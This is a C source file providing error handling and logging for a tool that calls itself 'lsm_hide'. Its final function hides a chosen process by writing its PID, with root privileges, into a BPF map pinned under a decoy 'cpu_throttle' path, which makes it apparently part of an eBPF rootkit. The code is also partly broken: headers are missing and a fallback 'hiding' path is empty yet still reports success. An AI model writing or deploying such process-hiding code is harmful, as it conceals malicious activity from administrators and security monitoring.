/* =====================================================
 *  Comprehensive Error Handling và Logging System
 *  Robust error handling với detailed logging
 * ===================================================== */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <syslog.h>
#include <stdarg.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>

/* Error codes */
typedef enum {
    LSM_SUCCESS = 0,
    LSM_ERROR_INVALID_PARAM = -1,
    LSM_ERROR_PERMISSION_DENIED = -2,
    LSM_ERROR_BPF_LOAD_FAILED = -3,
    LSM_ERROR_MAP_ACCESS_FAILED = -4,
    LSM_ERROR_KERNEL_INCOMPATIBLE = -5,
    LSM_ERROR_MEMORY_ALLOCATION = -6,
    LSM_ERROR_FILE_ACCESS = -7,
    LSM_ERROR_NETWORK_ERROR = -8,
    LSM_ERROR_TIMEOUT = -9,
    LSM_ERROR_UNKNOWN = -99
} lsm_error_t;

/* Log levels */
typedef enum {
    LOG_LEVEL_DEBUG = 0,
    LOG_LEVEL_INFO = 1,
    LOG_LEVEL_WARNING = 2,
    LOG_LEVEL_ERROR = 3,
    LOG_LEVEL_CRITICAL = 4
} log_level_t;

/* Error context */
struct error_context {
    lsm_error_t code;
    char message[512];
    char function[64];
    char file[128];
    int line;
    time_t timestamp;
    pid_t pid;
    uid_t uid;
};

/* Global error state */
static struct error_context last_error = {0};
static log_level_t current_log_level = LOG_LEVEL_INFO;
static FILE* log_file = NULL;
static bool syslog_enabled = true;

/* Error code to string mapping */
static const char* error_strings[] = {
    [0] = "Success",
    [-LSM_ERROR_INVALID_PARAM] = "Invalid parameter",
    [-LSM_ERROR_PERMISSION_DENIED] = "Permission denied",
    [-LSM_ERROR_BPF_LOAD_FAILED] = "BPF program load failed",
    [-LSM_ERROR_MAP_ACCESS_FAILED] = "BPF map access failed",
    [-LSM_ERROR_KERNEL_INCOMPATIBLE] = "Kernel incompatible",
    [-LSM_ERROR_MEMORY_ALLOCATION] = "Memory allocation failed",
    [-LSM_ERROR_FILE_ACCESS] = "File access error",
    [-LSM_ERROR_NETWORK_ERROR] = "Network error",
    [-LSM_ERROR_TIMEOUT] = "Operation timeout",
    [-LSM_ERROR_UNKNOWN] = "Unknown error"
};

/* Initialize logging system */
int init_logging(const char* log_file_path, log_level_t level) {
    current_log_level = level;
    
    /* Open log file if specified */
    if (log_file_path) {
        log_file = fopen(log_file_path, "a");
        if (!log_file) {
            fprintf(stderr, "Failed to open log file: %s\n", log_file_path);
            return LSM_ERROR_FILE_ACCESS;
        }
        
        /* Set appropriate permissions */
        chmod(log_file_path, 0640);
    }
    
    /* Initialize syslog */
    if (syslog_enabled) {
        openlog("lsm_hide", LOG_PID | LOG_CONS, LOG_DAEMON);
    }
    
    return LSM_SUCCESS;
}

/* Format timestamp */
static void format_timestamp(char* buffer, size_t size) {
    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", tm_info);
}

/* Core logging function */
static void log_message(log_level_t level, const char* function, 
                       const char* file, int line, const char* format, ...) {
    if (level < current_log_level) {
        return;
    }
    
    char timestamp[32];
    format_timestamp(timestamp, sizeof(timestamp));
    
    char message[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(message, sizeof(message), format, args);
    va_end(args);
    
    const char* level_strings[] = {"DEBUG", "INFO", "WARN", "ERROR", "CRIT"};
    const char* level_str = (level < 5) ? level_strings[level] : "UNKNOWN";
    
    /* Log to file */
    if (log_file) {
        fprintf(log_file, "[%s] %s %s:%d %s(): %s\n", 
                timestamp, level_str, file, line, function, message);
        fflush(log_file);
    }
    
    /* Log to syslog */
    if (syslog_enabled) {
        int syslog_priority;
        switch (level) {
            case LOG_LEVEL_DEBUG: syslog_priority = LOG_DEBUG; break;
            case LOG_LEVEL_INFO: syslog_priority = LOG_INFO; break;
            case LOG_LEVEL_WARNING: syslog_priority = LOG_WARNING; break;
            case LOG_LEVEL_ERROR: syslog_priority = LOG_ERR; break;
            case LOG_LEVEL_CRITICAL: syslog_priority = LOG_CRIT; break;
            default: syslog_priority = LOG_INFO; break;
        }
        syslog(syslog_priority, "%s:%d %s(): %s", file, line, function, message);
    }
    
    /* Log to stderr for errors and critical messages */
    if (level >= LOG_LEVEL_ERROR) {
        fprintf(stderr, "[%s] %s %s:%d %s(): %s\n", 
                timestamp, level_str, file, line, function, message);
    }
}

/* Logging macros */
#define LOG_DEBUG(fmt, ...) log_message(LOG_LEVEL_DEBUG, __func__, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define LOG_INFO(fmt, ...) log_message(LOG_LEVEL_INFO, __func__, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define LOG_WARNING(fmt, ...) log_message(LOG_LEVEL_WARNING, __func__, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define LOG_ERROR(fmt, ...) log_message(LOG_LEVEL_ERROR, __func__, __FILE__, __LINE__, fmt, ##__VA_ARGS__)
#define LOG_CRITICAL(fmt, ...) log_message(LOG_LEVEL_CRITICAL, __func__, __FILE__, __LINE__, fmt, ##__VA_ARGS__)

/* Set error context */
static void set_error_context(lsm_error_t code, const char* function, 
                             const char* file, int line, const char* format, ...) {
    last_error.code = code;
    last_error.timestamp = time(NULL);
    last_error.pid = getpid();
    last_error.uid = getuid();
    
    strncpy(last_error.function, function, sizeof(last_error.function) - 1);
    strncpy(last_error.file, file, sizeof(last_error.file) - 1);
    last_error.line = line;
    
    va_list args;
    va_start(args, format);
    vsnprintf(last_error.message, sizeof(last_error.message), format, args);
    va_end(args);
    
    /* Log the error */
    LOG_ERROR("Error %d: %s", code, last_error.message);
}

/* Error handling macros */
#define SET_ERROR(code, fmt, ...) do { \
    set_error_context(code, __func__, __FILE__, __LINE__, fmt, ##__VA_ARGS__); \
    return code; \
} while(0)

#define CHECK_NULL(ptr, fmt, ...) do { \
    if (!(ptr)) { \
        SET_ERROR(LSM_ERROR_INVALID_PARAM, fmt, ##__VA_ARGS__); \
    } \
} while(0)

#define CHECK_ERRNO(condition, fmt, ...) do { \
    if (condition) { \
        SET_ERROR(LSM_ERROR_FILE_ACCESS, fmt ": %s", ##__VA_ARGS__, strerror(errno)); \
    } \
} while(0)

/* Get last error */
const struct error_context* get_last_error(void) {
    return &last_error;
}

/* Clear last error */
void clear_last_error(void) {
    memset(&last_error, 0, sizeof(last_error));
}

/* Error-safe BPF operations */
int safe_bpf_map_lookup(int map_fd, const void* key, void* value) {
    CHECK_NULL(key, "BPF map lookup: key is NULL");
    CHECK_NULL(value, "BPF map lookup: value is NULL");
    
    if (map_fd < 0) {
        SET_ERROR(LSM_ERROR_MAP_ACCESS_FAILED, "Invalid map file descriptor: %d", map_fd);
    }
    
    int ret = bpf_map_lookup_elem(map_fd, key, value);
    if (ret != 0) {
        SET_ERROR(LSM_ERROR_MAP_ACCESS_FAILED, 
                 "BPF map lookup failed: %s", strerror(errno));
    }
    
    LOG_DEBUG("BPF map lookup successful on fd %d", map_fd);
    return LSM_SUCCESS;
}

int safe_bpf_map_update(int map_fd, const void* key, const void* value, uint64_t flags) {
    CHECK_NULL(key, "BPF map update: key is NULL");
    CHECK_NULL(value, "BPF map update: value is NULL");
    
    if (map_fd < 0) {
        SET_ERROR(LSM_ERROR_MAP_ACCESS_FAILED, "Invalid map file descriptor: %d", map_fd);
    }
    
    int ret = bpf_map_update_elem(map_fd, key, value, flags);
    if (ret != 0) {
        SET_ERROR(LSM_ERROR_MAP_ACCESS_FAILED, 
                 "BPF map update failed: %s", strerror(errno));
    }
    
    LOG_DEBUG("BPF map update successful on fd %d", map_fd);
    return LSM_SUCCESS;
}

/* Enhanced process hiding with error handling */
int hide_process_safe(pid_t pid) {
    LOG_INFO("Attempting to hide process PID %d", pid);
    
    if (pid <= 0) {
        SET_ERROR(LSM_ERROR_INVALID_PARAM, "Invalid PID: %d", pid);
    }
    
    /* Check if process exists */
    char proc_path[256];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    
    struct stat st;
    if (stat(proc_path, &st) != 0) {
        SET_ERROR(LSM_ERROR_INVALID_PARAM, 
                 "Process %d does not exist: %s", pid, strerror(errno));
    }
    
    /* Check permissions */
    if (geteuid() != 0) {
        SET_ERROR(LSM_ERROR_PERMISSION_DENIED, 
                 "Root privileges required to hide processes");
    }
    
    /* Attempt to add to BPF map */
    int map_fd = bpf_obj_get("/sys/fs/bpf/cpu_throttle/hidden_pid_map");
    if (map_fd < 0) {
        LOG_WARNING("BPF map not available, using fallback method");
        /* Continue with fallback implementation */
    } else {
        uint32_t key = pid;
        uint32_t value = 1;
        
        int ret = safe_bpf_map_update(map_fd, &key, &value, BPF_ANY);
        close(map_fd);
        
        if (ret != LSM_SUCCESS) {
            return ret;  /* Error already set by safe_bpf_map_update */
        }
    }
    
    LOG_INFO("Successfully initiated hiding for process PID %d", pid);
    return LSM_SUCCESS;
}

/* Cleanup function */
void cleanup_logging(void) {
    if (log_file) {
        fclose(log_file);
        log_file = NULL;
    }
    
    if (syslog_enabled) {
        closelog();
    }
}
